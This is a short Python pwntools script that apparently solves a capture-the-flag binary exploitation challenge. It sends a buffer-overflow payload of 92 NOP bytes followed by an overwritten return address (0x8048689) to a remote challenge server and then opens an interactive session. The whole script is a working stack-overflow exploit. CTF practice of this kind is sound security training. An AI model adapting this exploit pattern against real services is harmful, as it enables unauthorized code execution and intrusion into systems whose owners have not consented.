import base64
import subprocess

from pwn import *


alpha = '\x90'*92 + p32(0x8048689)
conn = remote('csie.ctf.tw', 10113)
#conn = remote('127.0.0.1', 8000)

print conn.recvrepeat(0.5)

raw_input('pause')
conn.send(alpha+'\n')

conn.interactive()
